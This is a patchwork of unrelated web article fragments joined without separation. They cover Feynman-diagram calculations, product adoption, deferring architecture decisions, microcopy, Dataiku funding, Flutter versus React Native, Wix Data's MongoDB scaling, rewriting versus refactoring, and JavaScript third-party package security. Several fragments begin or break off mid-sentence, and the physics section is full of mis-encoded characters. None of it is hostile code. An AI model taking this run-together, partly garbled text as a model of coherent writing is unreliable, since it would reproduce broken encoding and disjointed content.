<p>In a Feynman diagram the quarksâ€™ paths are represented by â€œlegs,â€� which join to form â€œverticesâ€� when particles interact. Feynman developed rules for turning this cartoon into an equation which calculates the probability that the event actually takes place: You write a specific function for each leg and vertex—generally a fraction involving the particleâ€™s mass and momentum—and multiply everything together. For straightforward scenarios like this one, the calculation might fit on a cocktail napkin.&nbsp;</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/abstractions_5242dbae24adf53fee012a27d96504f9.jpg" alt="nautilus gluon"><figcaption><br><span>Samuel Velasco/Quanta Magazine</span></figcaption></figure>
<p>But the golden rule of quantum theory is to consider all possibilities, and exchanging a simple gluon represents just one among a vast landscape of scenarios that could unfold when two quarks collide. The exchanged gluon might momentarily split into a â€œvirtualâ€� quark pair, for instance, before reconstituting itself in a flash. Two quarks enter and two quarks leave, but a lot can happen in the middle. A full accounting, implying a perfect prediction, would demand an infinite number of diagrams. No one expects perfection, but the key to improving a calculationâ€™s precision is getting further along in the infinite line of events.<strong>&nbsp;</strong><br></p>
<p>And thatâ€™s where physicists are getting stuck.&nbsp;</p>
<p>Zooming in to that hidden center involves virtual particles—quantum fluctuations that subtly influence each interactionâ€™s outcome. The fleeting existence of the quark pair above, like many virtual events, is represented by a Feynman diagram with a closed â€œloop.â€� Loops confound physicists—theyâ€™re black boxes that introduce additional layers of infinite scenarios. To tally the possibilities implied by a loop, theorists must turn to a summing operation known as an integral. These integrals take on monstrous proportions in multi-loop Feynman diagrams, which come into play as researchers march down the line and fold in more complicated virtual interactions.&nbsp;</p>
<p>Physicists have algorithms to compute the probabilities of no-loop and one-loop scenarios, but many two-loop collisions bring computers to their knees. This imposes a ceiling on predictive precision—and on how well physicists can understand what quantum theory says.&nbsp;</p>

</center>
<p>But there is one small mercy: Physicists donâ€™t need to calculate every last integral in a complicated Feynman diagram because the vast majority can be lumped together.<br></p>
<p>Thousands of integrals can be reduced to just dozens of â€œmaster integrals,â€� which are weighted and added together. But exactly which integrals can be subsumed under which master integrals is itself a hard computational question. Researchers use computers to essentially guess at millions of relationships and laboriously extract the combinations of integrals that matter.</p>
<p>But with intersection numbers, physicists may have found a way of elegantly plucking out the essential information from a sprawling calculation of Feynman integrals.</p>
<p><strong>A Geometric Fingerprint&nbsp;</strong></p>
<p>Mastrolia and Mizeraâ€™s work is rooted in a branch of pure math called algebraic topology, which classifies shapes and spaces. Mathematicians pursue this classification with â€œcohomologyâ€� theories, which allow them to extract algebraic fingerprints from complicated geometric spaces.</p>
<p>â€œItâ€™s kind of a summary, an algebraic gadget that incorporates the essence of the space you want to study,â€� said&nbsp;<a href="https://imag.umontpellier.fr/~dupont/" target="_blank">ClÃ©ment Dupont</a>, a mathematician at the University of Montpellier in France.</p>
<p>Feynman diagrams can be translated into geometric spaces that are amenable to analysis by cohomology. Each point within these spaces might represent one of a multitude of scenarios that could play out when two particles collide.</p>
<p>You might hope, naively, that by taking the cohomology of this space—finding its algebraic structure—you could calculate the weights for the master integrals that support it. But the type of geometric space that characterizes most Feynman diagrams is warped in a way that resists many cohomology calculations.</p>
<p>In 2017, Mizera was struggling to analyze how objects in string theory collide when he stumbled upon tools pioneered by Israel Gelfand and Kazuhiko Aomoto in the 1970s and 1980s as they worked with a type of cohomology called â€œtwisted cohomology.â€� Later that year Mizera met Mastrolia, who realized that these techniques could work for Feynman diagrams too. In 2019,&nbsp;they published three papers that used this cohomology theory to streamline calculations involving simple particle collisions.</p>
<p>Their method takes a family of related physical scenarios, represents it as a geometric space, and calculates the twisted cohomology of that space. â€œThis twisted cohomology has everything to say about the integrals we are interested in,â€� Mizera said.</p>
<p>In particular, the twisted cohomology tells them how many master integrals to expect and what their weights should be. The weights emerge as values they call â€œintersection numbers.â€� In the end, thousands of integrals shrink to a weighted sum of dozens of master integrals.</p>
<p>The cohomology theories that produce these intersection numbers may do more than just ease a computational burden—they could also point to the physical significance of the most important quantities in the calculation.</p>
<p>For example, when a virtual gluon splits into two virtual quarks, the quarksâ€™ possible lifetimes can vary. In the associated geometric space, each point can stand for a different quark lifetime. When researchers compute the weights, they see that scenarios with the longest-lasting virtual particles—that is, cases in which the particles become essentially real—shape the outcome the most.</p>
<p>â€œThatâ€™s the amazing thing about this method,â€� said Caron-Huot. â€œIt reconstructs everything starting from just these rare, special events.â€�</p>
<p>In August 2020,&nbsp;Mizera, Mastrolia and colleagues published&nbsp;<a href="https://arxiv.org/abs/2008.04823" target="_blank">another preprint</a>&nbsp;showing that the technique has matured enough to handle real-world two-loop diagrams. A forthcoming paper by Caron-Huot will push the method further, perhaps bringing three-loop diagrams to heel.</p>
<p>If successful, the technique could help usher in the next generation of theoretical predictions. And, a few researchers suspect, it may even foreshadow a new perspective on reality.</p>

Sometimes a feature can increase the adoption of a product, and sometimes that feature won’t even get used for the low adoption of the product. Know the minimum feature set required for adoption.</li><li>Recognize that problem lies somewhere else if adoption isn’t increasing after multiple efforts.</li></ul><p><strong>Not all features are equal</strong></p><ul><li>Adoption seems to have an inverse relationship with the type of clients your product has.</li></ul><figure><img loading="lazy" width="700" height="487" src="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=700%2C487&amp;ssl=1" alt="" srcset="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=1024%2C713&amp;ssl=1 1024w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=300%2C209&amp;ssl=1 300w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=768%2C535&amp;ssl=1 768w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=434%2C302&amp;ssl=1 434w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=868%2C604&amp;ssl=1 868w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?w=1257&amp;ssl=1 1257w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=1024%2C713&amp;ssl=1 1024w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=300%2C209&amp;ssl=1 300w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=768%2C535&amp;ssl=1 768w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=434%2C302&amp;ssl=1 434w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=868%2C604&amp;ssl=1 868w, https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?w=1257&amp;ssl=1 1257w" data-lazy-src="https://i2.wp.com/agyam.com/blog/wp-content/uploads/2020/08/Adoption-wrt-type-of-businesses.png?resize=700%2C487&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Small clients can easily adopt whereas enterprises take their own time.</figcaption></figure><ul><li>It is ok to have some features build for limited enterprise clients having a disproportionate ratio of product revenue.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Prudent dating advice would be to get to know someone first, before making an everlasting commitment to them. The same advice holds when designing software systems. Don’t marry yourself to your design decisions before at least getting to learn more about them first. Once you have learned their quirks and seen how they act under pressure, you can make a much more informed decision about whether you want to commit. When I am designing new software from scratch I often think about this quote from Uncle Bob.</p><div><blockquote><p>Good architecture allows major architectural decisions to be deferred. The job of an architect is not to make decisions, but to defer those decisions for as long as possible, To allow the program to be built in the absence of decisions so that decisions can be made later with the most possible information</p></blockquote></div><p>At the point you start a new project, you have the least amount of possible knowledge about that project. As The Project Paradox states, this is the worst possible time to be committing to major decisions.</p><blockquote><p lang="en" dir="ltr">The project paradox: making the biggest decisions when knowledge is at it's absolute lowest. <a href="https://t.co/b7zBa4Aq7m">pic.twitter.com/b7zBa4Aq7m</a></p>— Tobias Fors (@tofo) <a href="https://twitter.com/tofo/status/512666251055742977?ref_src=twsrc%5Etfw">September 18, 2014</a></blockquote><p>The more time you spend in the problem space, the more information you can gather and the better decision you can make when the time comes. For example, you can probably start working on your domain logic without knowing how the data is going to be served to the client, or what particular flavour of database you are going to use. Once you have chosen a database, by carefully encapsulating the access logic, if it turns out that this database isn’t the one, it is much easier to part ways amicably.</p><p>Structure your code in such a way that you don’t have to commit to major decisions up front, and perhaps you too can live happily ever after.</p></section></div>]]>

        <p>Good microcopy is one of the fastest ways to improve an interface. Try doing an audit on your UI with these tips to see how it stands up.</p>

<h2 id="1-use-personal-pronouns">1) Use personal pronouns</h2>

<p>Address the reader instead of just talking out loud. Use the word <em>you</em>. People pay more attention when you talk directly to them.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post1.png">
</figure>

<h2 id="2-start-with-a-verb">2) Start with a verb</h2>

<p>Names for interactive elements should begin with an action verb. The same goes for important copy. Starting with a verb is more direct and engaging.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post2.png">
</figure>

<h2 id="3-prevent-concerns">3) Prevent concerns</h2>

<p>Point out concerning actions before your user can worry about your motives. Be transparent<span>—</span>make sure they understand what they’re doing and why.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post3.png">
</figure>

<h2 id="4-use-natural-language">4) Use natural language</h2>

<p>Write conversationally, like you’re one-on-one. Be professional but get rid of jargon. Use familiar, simple words with a friendly, relaxed tone.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post4.png">
</figure>

<h2 id="5-default-to-active-voice">5) Default to active voice</h2>

<p>Most of the time, active voice is the way to go. It’s easier to understand than passive voice, feels more personal, and is often shorter and stronger.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post5.png">
</figure>

<h2 id="6-show-useful-error-messages">6) Show useful error messages</h2>

<p>Avoid negative, threatening, or overly technical words. Be friendly, show empathy, take the time to explain what’s going on, and be helpful.</p>

<figure>
    <img src="https://learnuxd.io/img/7-tips-for-better-microcopy/post6.png">
</figure>

<h2 id="7-write-iteratively">7) Write iteratively</h2>

<p>We write code iteratively, so why everything else? Things probably won’t be perfect the first time around. Test, refine, ship again. It adds up.</p>

<p>Dataiku <a href="https://blog.dataiku.com/dataiku-series-d-fueling-the-future-of-enterprise-ai" target="_blank" rel="noreferrer noopener">announced</a> that it raised $100 million Series D funding for enhancing the platform to empower different data-driven firms to leverage data effectively. Lead by Stripes with Tiger Global Management and joined by existing investors Battery Ventures, CapitalG, Dawn Capital, FirstMark Capital, and ICONIQ. In December 2019, Dataiku was valued at $1.4 billion when Alphabet’s investment firm CapitalG poured money into the company.</p>



<p>In an attempt to democratize Enterprise AI, Dataiku is committed to explore new opportunities and include functionalities in its end-to-end data science platform. There is a sudden change in people behaviour, which has forced organizations to transform the delivery of services and products.</p>

<p>Dataiku wants to capitalize on the opportunity by allowing companies to bring resilience in the difficult times caused by COVID-19 with its robust platform. The firm already enables users to collaborate for data science projects, code to click, model development, model prediction, and model deployment.</p>



<p>Founded in 2013, today, the company has more than 450 employees, 300 customers, and partners around the globe. Due to its feature-rich Dataiku platform, the company has quickly gained traction in the data science domain.</p>



<figure><blockquote><p>I suspect in ten years we won’t be using spreadsheets</p><cite>Florian Douetteau, CEO of Dataiku</cite></blockquote></figure>



<p>Currently, Dataiku’s significant competitors are Alteryx, Databricks, and more, which have made reasonable grounds in the self-service analytics domain. All these platforms, including Dataiku, are working towards democratizing data by allowing users to get insight into information without programming skills.</p>



<p>According to Dataiku, with this Series D funding, the company will continue to simplify its platform for organizations to have hundreds, thousands, or hundreds of thousands of machine learning models in production.</p>

<p>Flutter vs React Native, two widely used cross platform tools, but what should I use?. In this “experiment”, Im going to try to develop the same app, in both frameworks, the goal is to spot differences between them.</p>
<p>No framework is better than the other, they work in different ways, and they fit different developer requirements</p>
<h2>Main differences</h2>
<p>For me the main difference between them, is that React Native run using a Javascript bridge, while Flutter is compiled to native code. This is strictly reflected in the performance of each one.</p>
<figure><table><tbody><tr><td></td><td>Flutter</td><td>React Native</td></tr><tr><td>Language</td><td>Dart</td><td>Javascript</td></tr><tr><td>Compiles native code</td><td>Yes</td><td>No</td></tr><tr><td>Maintained by</td><td>Google</td><td>Facebook</td></tr></tbody></table></figure>
<h2>What im going to build and test</h2>
<p>I will write an app in both frameworks, will be a simple app using the <a aria-label="Rick and Morty API (opens in a new tab)" href="https://rickandmortyapi.com/" target="_blank" rel="noreferrer noopener">Rick and Morty API</a>.</p>
<p>I’m going to test:</p>
<p>Part 1</p>
<ul><li>How fast is to install each framework create and run an app</li><li>Reloading time, both frameworks have hot reloading, a fast one is needed for a seamlessly development workflow</li><li>Development experience, which one offers a better development experience</li></ul>
<p>Part 2</p>
<ul><li>Writing the app in React Native</li><li>Writing the app in Flutter</li></ul>
<p>Part 3</p>
<ul><li>Testability, how easy is to test each app</li><li>Stress test and benchmarking </li></ul>
<h2>Installing Flutter and React Native</h2>
<p>Before I start, i have already installed in my computer Android Studio and Xcode, since they are not related directly to any framework, I won’t include their installation process.</p>
<h3>Flutter process</h3>
<ol><li>Install the <a aria-label="Flutter SDK (opens in a new tab)" href="https://flutter.dev/docs/get-started/install" target="_blank" rel="noreferrer noopener">Flutter SDK</a> (2min)</li><li>Add the Flutter SDK PATH (20s)</li><li>Create the app with flutter create (1min)</li></ol>
<p>The whole process to install Flutter took me 3 minutes, not including the downloading time, also Flutter provides a tool called flutter doctor, which for first installs is really useful it scans our system to check if we have all the needed tools for flutter development (Xcode, Android Studio, Dart plugins, VScode extensions…)</p>
<h3>React Native process</h3>
<p>You can use Expo, but I will use React Native CLI</p>
<ol><li>Install Node.js (3min)</li><li>Install watchman (2min</li><li>Create our app with typescript support (2min)</li></ol>
<p>Total time, 7 mins, and i needed to fix my nvm versions, also first build took about 3 minutes to start.</p>
<p>The Flutter installation process was smoother and faster than the React Native one, probably because RN needs to deal with Node.js under the hood…</p>
<h2>Development experience</h2>
<h3>Hot reloading</h3>
<p>Hot reloading is a must feature for me in web and app development, both, React Native and Flutter have the same feature.</p>
<p>I tested both with the default app which each framework creates</p>
<p>Flutter took 47ms to hot reload the app</p>
<p>React Native took 630ms, because it needs to compile javascript and inject it again with Metro.</p>
<p>Also a note on this, Flutter hot reloading only worked for me if I run my app from VScode, if i run the flutter app from an external terminal, the <strong>automatic hot reloading</strong> doesn’t work, I need to type r to hot reload the app, while in React Native you only need to save the file. I guess this is the only tradeoff. </p>
<h3>Extensions</h3>
<p>I installed Flutter extension for VScode, which is very recommended from the dev team. It adds an extension icon in your sidebar, and you can view your project structure from that tab.</p>
<p>For React Native I added React Native Tools, you can run React Native commands directly from your VScode command palette, but if you run your app from a terminal i don’t find it very useful</p>
<h3>Debugging</h3>
<p>Both frameworks come with their own debugging tools, however, for me Flutter ones are more useful.</p>
<p>One thing I don’t like about React Native debugger is that you can’t see directly your network requests, you need to do some tweaks in order to do that, you can see more info about that <a aria-label="here (opens in a new tab)" href="http://One thing I don't like about React Native debugger is that you can't see directly your network requests, you need to do some tweaks in order to do that, you can see more info about that here" target="_blank" rel="noreferrer noopener">here</a></p>
<p>Here you can see each one debugger GUI</p>
<p>React Native:</p>

<p>Flutter:</p>

<h2>Conclusion on Part 1</h2>
<p>In terms of development experience, Flutter is the winner for me, the whole process from 0 to app running in my emulator didn’t took more than 10 minutes.</p>
<p>With React Native, compilation took a lot of time (I’m running each one in a 16″ 2019 Macbook Pro), also i had some Node.js issues.</p>

Corvid is a serverless code platform for site builders, which lets developers add frontend and backend code to their Wix sites.</span></p><p id="viewer-4ipl4"><span>Part of Corvid is a product called </span><a href="https://support.wix.com/en/article/about-wix-data" target="_blank" rel="noopener"><span><u>Wix Data</u></span></a><span>. It allows anyone with a Wix website to own a document database. You can use it in multiple ways - via our visual tools to bind content in your collections to forms, tables, and other components on your site, or just access it via API from code running within your site. Think of it as “Database as a Service”, not unlike Google’s Firestore.</span></p><p id="viewer-4rkm2"><span>Behind the scenes, user data is stored in MongoDB. Which works really well, but as we are soon to find out - everything has its limits. </span></p><p id="viewer-ko3m"><span>Back at the time of Wix Code, every user collection was stored in a dedicated MongoDB collection in one of our server clusters. Each site had (and still has) mapping information, which would tell the cluster and the database where the site data is located. Collections themselves were named according to the following pattern:</span></p><p id="viewer-c6cjv">	<span>{site}@{dev/public}@{collection name}. </span></p><p id="viewer-46pqu"><span>Each user effectively had (and still has, in fact) two databases - DEV, used for development, and PUBLIC - used in the live site.

Naturally, as the number of collections in a single database grew, listing them all started to become slower and slower. At the time all data was stored in a single cluster, all collections were split into a total of 10 databases. The fix here was quite easy - we need to split all the collections into more databases. And that is what we did.</span></p><p id="viewer-6grke"><span>But at the same time another problem had been manifesting - our backups instance started having problems. It was getting really really slow at creating backups and one time even crashed. See, in MongoDB every collection gets its own file handle. And so as the system tried to make backups, it would open a number of handlers which was equal to the number of collections we had.</span></p><p id="viewer-dhikr"><span>This meant we had to:</span></p><ol><li id="viewer-e9piu"><p><span>Increase process file handle limit, just to stop the OS from killing an instance because the limit would be exhausted;</span></p></li><li id="viewer-1t5s9"><p><span>Tune the file handle garbage collection, as Mongo was still having troubles and slowing down as soon as the number of open file handles grew into 10s of k.</span></p></li></ol><p id="viewer-e1b5k"><span>Soon after the backups issue was resolved, we saw this problem manifest in other places - like spinning up a new replica, which didn’t always succeed on the first or even on the second try. Needless to say, neither the engineering team nor the DBAs enjoyed that rush of cortisol induced by just trying to add more capacity to the system.</span></p><p id="viewer-dgeb6"><span>The obvious easy solution was to scale out with more instances, which is exactly what we did at the time. But we were lucky. Our product was growing in popularity and that meant we had to keep adding new instances every time we reached 100k new collections. And a typical website had way more than one.</span></p><p id="viewer-bo4to"><span>A year and a half after the launch, we had lots of MongoDB instances that were sitting mostly idle. Some sites are really big and receive lots of visitors, many others follow a different pattern. A new artist portfolio typically has a collection with around 30 works, which is also similar to a number of items a boat rental company has in its boat inventory collection. Given this and probably more importantly - the enthusiasm of our DBAs having to keep up with our success and having to spin up more MongoDB clusters (did I mention that Wix Data is global and each cluster has quite a few instances all over the world?) - we had to do something.</span></p><p id="viewer-e0h9j"><span>We gathered in the DBA room in one of our Tel Aviv offices and rather quickly a simple and elegant solution sprang into existence.

<p>
We're ready to start our journey.  We have an application that's riddled with technical debt, woefully out of date, or just generally underserving its users, and so we need to understand what our best option is going forward - does it make more sense to continue to plod along and incrementally refactor?  Or do we blow it all up and rewrite from scratch?  This is the basic dilemma we'll be exploring in <a href="http://www.bennorthrop.com/rewrite-or-refactor-book/index.php">this book</a>.  So let's get going...
</p>

<p>
But not so fast!  Before we go any further we need to address the elephant in the room, which is this: for any legacy application in need of improvement, <b>what to do next is not a simple this-or-that decision</b>.  We may frame our options generally as <i>rewrite</i> or <i>refactor</i>, but these terms, as we'll see, are really just stand-ins for a whole spectrum of choices that lie before us.  
</p>

<img src="http://www.bennorthrop.com/rewrite-or-refactor-book/Rewrite-Refactor-Spectrum.png">

<p>
By refactoring, within the context of modernizing a legacy application, we typically mean that we're going to keep the application mostly as it is, but make some minor, internal improvements to solve specific problems (like maintainability, extensibility, etc.).  By rewriting, on the other hand, we imply that we intend to "start again from scratch", or in other words to make major changes.  
</p>

<p>
But this only begs the next question!  What exactly do we mean by <i>minor</i> and <i>major</i>?  If we plan to upgrade our frontend framework from AngularJS to React but keep the backend services as they are, is that a refactor or rewrite?  Or what about if we want to break a monolith into three different microservices, but the business logic is just copied-and-pasted into new version-control repos - is that a rewrite, refactor, or something else?  And do we even care?  Does labeling our effort really matter?
</p>

<p>
Yes, it does.  Although our job is to build working software and not philosophize about semantics, the words we use <i>do</i> make a difference.  When we suggest the path of rewriting or to refactoring, business and technology stakeholders should understand exactly what we mean and what type of effort will be entailed.  In other words, some <b>precision in our terms will help us better set expectations</b>.  Further, as we burn through some of this conceptual fog and find clearer definitions, it will also give us a more nuanced view of this decision, and move us beyond the narrow <i>rewrite or refactor</i> framing.  
</p>
<p>
So like any big journey, let's spend a little time packing before we jump in the car and go.  We don't want to show up at the beach and realize we forgot our swim suit.  
</p>


<h3>Functional Improvement</h3>
<p>
A good place to start is to define what rewrites and refactors are <i>not</i>, which are strategies to improve the functionality of an application.  This type of work, whether it's fixing defects, delivering new features, or cleaning up the user interface, we can call enhancement.  It's about improving on what the application <i>does</i> for its users, and as we'll see later, it's the normal state of development.  
</p>
<img src="http://www.bennorthrop.com/rewrite-or-refactor-book/Rewrite-Refactor-Functional.png">
<p>
In some cases, the scope of the functional enhancements can be quite large though.  The business may determine that the app serves the right user base, for example, but the features all need to be overhauled.  It may be tempting to call this case a rewrite as well, however we're going to make a distinction here.  Because this type of effort entails building <i>all</i> new functionality, it is basically indistinguishable from greenfield development.  When new functional requirements need to be defined, a separate system is developed from scratch, and no carry over of logic or code is possible, we will consider this to be development of a greenfield app and not a rewrite.  
</p>



<h3>What we mean by Refactoring</h3>
<p>
Adding functionality to an application is not what this book is about. Our situation is that the application generally does <i>what</i> it is expected to do, but is lacking in the <i>how</i> - in other words, the non-functional or <a href="http://www.qasigma.com/2008/12/software-quality-attributes.html">quality attributes</a> of the system.  For example, users might be happy with the set of features, but the application might be excessively difficult to maintain, or it may crash frequently, or may perform poorly under peak load.  It's when these non-functional attributes are lacking that we consider a rewrite or refactor.  
</p>
<p>With respect to refactoring, we often use this term to refer to different scopes of work. In his book <a href="https://martinfowler.com/books/refactoring.html"><i>Refactoring</i></a>, <a href="https://martinfowler.com/">Martin Fowler</a> defines it this way:
</p>

<p>
Refactoring is a disciplined technique for restructuring an existing body of code, altering its internal structure without changing its external behavior.
</p>

<p>
In this purist sense, refactoring is primarily about making the code more maintainable.   This might be decomposing long or complex functions, fixing inconsistent naming, adding unit tests, or restructuring class hierarchies, data structures, or schemas.  Note that nothing that is <i>visible</i> to the user changes, but the internal code structure is modified to make it easier to work with for developers, thus improving our productivity (and happiness!).   
</p>

<p>
In the context of our rewrite or refactor decision, however, this definition is too restrictive.  When we talk about refactoring in this context, we're not typically making a distinction between internal and external, but rather about <b>functional and non-functional</b>.  For example, we may say that we are choosing to refactor the existing code base to improve the reliability or performance of the application.  These quality attributes are technically not <i>internal</i> properties of the system (they are very visible to the users in that they directly impact them), they are just <i>non-functional</i>.  This might be a pedantic distinction, but in the spirit of precision, I think it's important to call out.   In this book we'll be using a broader definition of refactoring:
</p>

<p>
Refactoring is an approach by which an existing body of code is incrementally restructured in order  to improve the quality attributes of the system.
</p>

<p>
Lastly, it's important to note that refactoring is about iterative change.  It's making minor tweaks to the application, delivering them, and then rinse and repeat.  Layered in with functional enhancements, refactoring can keep our users happy and our codes base healthy, minimizing technical debt and feature gaps.  When neglected, however, we may need to consider the more heavy-weight alternative.
</p>

<h3>What we mean by Rewriting</h3>
<p>
Like refactoring, rewriting has the same basic goal - to improve the non-functional nature of the application.  The difference is in how much is changed.  Simply put, if refactoring is duct tape, rewriting is a sledge hammer or a back hoe.  It's not about making incremental improvements to what is there, it's about blowing it up and building anew.  With respect to the other types of development efforts we've discussed, we can visualize a rewrite this way:
</p>

<img src="http://www.bennorthrop.com/rewrite-or-refactor-book/Rewrite-Refactor-Quadrant.png">


<p>
We can say then that a rewrite is an effort that <b>involves major changes to the system in order to make fundamental improvements to its quality attribute</b>s.  But there is gray area.  Rewrite efforts often spill over into the other quadrants.  For example, an application may be so crippled by technical debt that it's virtually impossible to add new features.  We may choose then to rewrite  and build a new foundation to improve maintainability and extensibility (quality attributes), but during the course of that rewrite we may also sneak in a few new features to satisfy the business.  It's fundamentally a rewrite, but there is some enhancement going on as well.  
</p>
<p>
Likewise, there is some fuzziness at the boundary of rewrite and refactor.  There are lift-and-shift scenarios where the system is moved to a new platform making it essentially a different application, but the code implementation within it is mostly the same - i.e. not refactored.  This feels like a rewrite, but is it?  How much do we have to change to consider it a rewrite?
</p>

<p>Again, let's see if we can add some precision.  For the purpose of this book, let's use the following definition:
</p>

<p>
Rewriting is re-building the same functionality that exists in a legacy application but using a different language/framework, maintaining within a new code repository (not just a branch), and deploying as an entirely new artifact (possibly to a different platform - e.g. servers, hardware, serverless, client, etc.).
</p>

<p>
In other words, we're drawing some clear lines.  If, for example, we're rewriting an important function, class, or even module, but our work is made in a branch off of the mainline of our codebase, it's not a rewrite.  Likewise, if we re-implement a segment of the application, but the system itself is still deployed as the same artifact (binary, WAR, etc.), this also is not a rewrite.  Rewrites within our context are BIG.  They are about major changes that necessitate an entirely new application to be built and deployed.  Yes, there may be incremental steps along the road to get there, as we'll see later, but it is a fundamentally different effort than refactoring.  
</p>

<p>
To help clarify things in your individual case, it can be helpful to diagram this out.  For the different possible paths for modernizing or improving your application, what exactly is being changed?  Here's an example:
</p><div>

<p><img src="http://www.bennorthrop.com/rewrite-or-refactor-book/Rewrite-Refactor-Distinction.png"></p></div><p>
In practice, the nature of the changes may not line up neatly with the definitions of rewrite or refactor, and that's ok.  The diagram above, for example, might represent a case where we're proposing to re-implement a service using a more modern set of technologies, but while keeping the exposed API and underlying persistence structure the same.  This represents a blend of minor and major changes, so it still may not be clear precisely what to label it.  What's important, however, is that we've arrived at deeper level of detail which will help us better reason about and justify the decision.  
</p>

<p>
Now we're almost done with our preparations, but before we get on with our …</p></section></div>

<p>I recently posted the following Tweet with regards to the current state of the third-party security problem in the JavaScript ecosystem:

</p><blockquote><div lang="en" dir="ltr"><p>Having worked on and followed modules standards from TC39 and WhatWG to Node.js, it's so so clear that security was, is, and always will be an afterthought.</p><p>Where are the secure-by-default open platform developments? Crypto is the only community I see doing it.</p></div>— Guy Bedford (@guybedford) <a href="https://twitter.com/guybedford/status/1296935308445900801?ref_src=twsrc%5Etfw">August 21, 2020</a></blockquote> 

<p>I wanted to fill in some of the background to this from my own work on Node.js modules and security concepts, following the Agoric SES and compartment models, and from a growing feeling of the inadequacy of the Node.js, Deno and browser runtimes for supporting the third-party security needs of the ecosystem.

</p><p><em>TLDR; I think we need to think about new more secure runtimes for JS, and it should be a collaborative effort, with the components being modules, adding isolated scopes to import maps, and a careful security model plus compatibility with the existing ecosystem. <a href="#secure-modular-runtime-proposal">Skip ahead to the proposal here.</a></em>

</p><p><em>Update: Since posting this, I see that <a rel="noopener" target="_blank" href="https://github.com/Agoric/SES-shim/tree/master/packages/endo">Endo</a> and <a rel="noopener" target="_blank" href="https://github.com/LavaMoat/LavaMoat">LavaMoat</a> provide techniques very close to these directions, although neither has quite yet taken the leap that I argue is necessary that such a security system should be integrated into the primary runtime itself.</em></p>

<h2><a href="#third-party-security-problem">#</a>The Third-Party Security Problem</h2>

<p>The underlying issue is the <code>npm install</code> one. As the registry and our dependence on it continues to expand, the security gap here continues to grow in terms of the amount of untrusted code we are running on a daily basis.

</p><p>Maintainers giving up their time freely now find themselves obliged to respond to regular security issues or risk having unpatchable advisories released for their packages, which may or may not even be genuine escalations of privilege.
  We engage in security theatre to create the illusion of safety, and yet all the while everything remains highly unsecure.

</p><p>Rather than simply accepting the status quo, many companies are actively working on mitigating these security properties. The problem is that they end up creating side ecosystems or patches to the existing ecosystem, security measures that are never fundamentally designed into the ecosystem itself. Third-party security remains a huge if not impossible effort, that only dedicated teams can afford to tackle, as we see for example with these intiatives by <a rel="noopener" target="_blank" href="https://www.figma.com/blog/how-we-built-the-figma-plugin-system/">Figma</a> or <a rel="noopener" target="_blank" href="https://developer.salesforce.com/blogs/developer-relations/2017/02/lockerservice-lightning-container-third-party-libraries-lightning-components.html">Salesforce</a>.

</p><p>The <a rel="noopener" target="_blank" href="https://github.com/tc39/proposal-realms">Realms proposal</a> may give us the tools for constructing a secure runtime, but the JavaScript ecosystem conventions themselves work against supporting security restrictions.

</p><p>The general view from Chrome/v8, is that this type of third-party per-package security within the same process isn't possible:

<p>Now I admit I have fully bought in to the elegance of the the OCAP, SES and compartment models, the ideas shared by those at Agoric (who are long-time members of TC39). I gave a session on these concepts at the Node.js Collaboration summit.

</p><p>For all the tremendous benefits of the concept of modular security, there are certainly important questions, but I believe we should actively tackle this work and these questions, and not abandon the same-process modular security models unless they can be fully disproved.

<a name="compartment-model"></a>
</p><h2><a href="#compartment-model">#</a>The Compartment Model</h2>

<p>The gist of the compartment model builds on top of SES (<a rel="noopener" target="_blank" href="https://github.com/Agoric/ses-shim">Secure ECMAScript</a>), as proposed by Agoric, something like the following:

</p><ol>
  <li>All capabilities are imported through the module system (<code>import fetch from 'fetch'</code> kind of thing) - <em>the module resolver acts as the capability system, enforcing permissions</em>.</li>
  <li>The consequence of (1) is that <em>all global capabilities should be disabled / carefully controlled.</em></li>
  <li>JavaScript needs a whole bunch of patching to prevent prototype mutations and unintentional side channels such as <code>return { toString() {} }</code> object hooks. You have to manage package interfaces very carefully and freeze the entire global object from prototype mutation.</li>
</ol>

<p>See the talk by Mark Miller on <a rel="noopener" target="_blank" href="https://www.youtube.com/watch?v=9WdbTucMaRo">Extremely Modular Distributed JavaScript</a>, or my presentation from the Node.js Collaboration Summit,
<a rel="noopener" target="_blank" href="https://docs.google.com/presentation/d/1VUpxoxitZCINJI7jXec4i87YiYZsXr8pCSHdHY5pW30/edit?usp=sharing">Security, Modules and Node.js</a>, for a more in-depth coverage of the full model.

</p><p>The result of this model is, in theory, the ability to restrict destructive code. The date time library you npm install cannot install a trojan horse on your computer, which seems a pretty useful property to have.

